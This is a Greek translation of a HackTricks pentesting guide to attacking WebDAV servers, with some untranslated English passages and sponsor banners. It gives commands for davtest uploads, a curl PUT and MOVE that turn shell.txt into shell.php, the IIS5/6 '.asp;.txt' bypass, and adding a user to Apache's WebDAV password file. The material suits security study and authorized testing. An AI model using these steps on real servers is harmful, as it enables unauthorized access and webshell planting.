# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Όταν ασχολείστε με ένα **HTTP Server με ενεργοποιημένο το WebDav**, είναι δυνατόν να **διαχειριστείτε αρχεία** αν έχετε τις σωστές **πιστοποιήσεις**, συνήθως επαληθευμένες μέσω **HTTP Basic Authentication**. Η απόκτηση ελέγχου πάνω σε έναν τέτοιο διακομιστή συνήθως περιλαμβάνει το **ανέβασμα και εκτέλεση ενός webshell**.

Η πρόσβαση στον διακομιστή WebDav απαιτεί συνήθως **έγκυρες πιστοποιήσεις**, με το [**WebDav bruteforce**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) να είναι μια συνηθισμένη μέθοδος απόκτησής τους.

Για να ξεπεράσετε τους περιορισμούς στο ανέβασμα αρχείων, ειδικά αυτούς που εμποδίζουν την εκτέλεση σερβερ-πλευρικών σεναρίων, μπορείτε:

- Να **ανεβάσετε** αρχεία με **εκτελέσιμες επεκτάσεις** απευθείας αν δεν υπάρχουν περιορισμοί.
- Να **μετονομάσετε** τα ανεβασμένα μη-εκτελέσιμα αρχεία (όπως .txt) σε μια εκτελέσιμη επέκταση.
- Να **αντιγράψετε** τα ανεβασμένα μη-εκτελέσιμα αρχεία, αλλάζοντας την επέκτασή τους σε μια που είναι εκτελέσιμη.

## DavTest

Το **Davtest** προσπαθεί να **ανεβάσει αρκετά αρχεία με διάφορες επεκτάσεις** και να **ελέγξει** αν η επέκταση **εκτελείται**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Αυτό δεν σημαίνει ότι τα αρχεία με τις επεκτάσεις **.txt** και **.html εκτελούνται**. Αυτό σημαίνει ότι μπορείτε να **έχετε πρόσβαση σε αυτά τα αρχεία** μέσω του web.

## Cadaver

Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **συνδεθείτε στον διακομιστή WebDav** και να εκτελέσετε ενέργειες (όπως **ανέβασμα**, **μετακίνηση** ή **διαγραφή**) **χειροκίνητα**.
```
cadaver <IP>
```
## Αίτηση PUT

A PUT request is used to update or create a resource on a server. It is commonly used in WebDAV (Web Distributed Authoring and Versioning) to upload files to a server. The PUT method allows the client to specify the URI (Uniform Resource Identifier) of the resource to be updated or created, and the server will handle the request accordingly.

Η αίτηση PUT χρησιμοποιείται για την ενημέρωση ή δημιουργία ενός πόρου σε έναν διακομιστή. Χρησιμοποιείται συνήθως στο WebDAV (Web Distributed Authoring and Versioning) για τη μεταφόρτωση αρχείων σε έναν διακομιστή. Η μέθοδος PUT επιτρέπει στον πελάτη να καθορίσει το URI (Uniform Resource Identifier) του πόρου που θα ενημερωθεί ή δημιουργηθεί, και ο διακομιστής θα χειριστεί την αίτηση αναλόγως.
```
curl -T 'shell.txt' 'http://$ip'
```
## Αίτηση MOVE

The MOVE request is used in WebDAV to move a resource from one location to another. It is similar to the HTTP `PUT` method, but instead of creating a new resource, it moves an existing resource to a new location.

### Syntax

```
MOVE /path/to/source HTTP/1.1
Host: example.com
Destination: /path/to/destination
```

### Example

```
MOVE /file.txt HTTP/1.1
Host: example.com
Destination: /new/location/file.txt
```

In this example, the file `file.txt` is moved from its current location to `/new/location/file.txt`.

### Response

The server should respond with a `200 OK` status code if the move operation is successful. If the destination already exists, the server may choose to overwrite it or return a `412 Precondition Failed` status code.

### Security Implications

The MOVE request can be used by an attacker to move sensitive files to a location accessible to them. This can lead to unauthorized access or exposure of sensitive information. It is important to properly secure and validate the MOVE request to prevent such attacks.
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ευπάθεια IIS5/6 WebDav

Αυτή η ευπάθεια είναι πολύ ενδιαφέρουσα. Το **WebDav** δεν επιτρέπει το **ανέβασμα** ή τη **μετονομασία** αρχείων με την επέκταση **.asp**. Ωστόσο, μπορείτε να το παρακάμψετε προσθέτοντας στο τέλος του ονόματος το **";.txt"** και το αρχείο θα εκτελεστεί σαν να ήταν αρχείο .asp (μπορείτε επίσης να χρησιμοποιήσετε ".html" αντί για ".txt" αλλά **ΜΗΝ ξεχάσετε το ";"**).

Στη συνέχεια, μπορείτε να ανεβάσετε το shell σας ως αρχείο ".**txt"** και να το αντιγράψετε/μετακινήσετε σε ένα αρχείο ".asp;.txt". Αν αποκτήσετε πρόσβαση σε αυτό το αρχείο μέσω του διακομιστή ιστού, θα εκτελεστεί (το cadaver θα πει ότι η ενέργεια μετακίνησης δεν λειτούργησε, αλλά λειτούργησε).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Αποστολή διαπιστευτηρίων

Εάν το Webdav χρησιμοποιούσε έναν διακομιστή Apache, θα πρέπει να ελέγξετε τις ρυθμίσεις των ιστότοπων στο Apache. Συνήθως:\
_**/etc/apache2/sites-enabled/000-default**_

Μέσα σε αυτό, μπορείτε να βρείτε κάτι όπως:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Όπως μπορείτε να δείτε, υπάρχουν τα αρχεία με τα έγκυρα **διαπιστευτήρια** για τον διακομιστή **webdav**:
```
/etc/apache2/users.password
```
Μέσα σε αυτού του είδους αρχεία θα βρείτε το **όνομα χρήστη** και ένα **hash** του κωδικού πρόσβασης. Αυτές είναι οι πιστοποιητικές πληροφορίες που χρησιμοποιεί ο διακομιστής webdav για την αυθεντικοποίηση των χρηστών.

Μπορείτε να προσπαθήσετε να τα **αποκρυπτογραφήσετε**, ή να **προσθέσετε περισσότερα** αν για κάποιο λόγο θέλετε να **αποκτήσετε πρόσβαση** στον διακομιστή **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Για να ελέγξετε αν οι νέες πιστοποιητικές πληροφορίες λειτουργούν, μπορείτε να κάνετε:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Αναφορές
* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
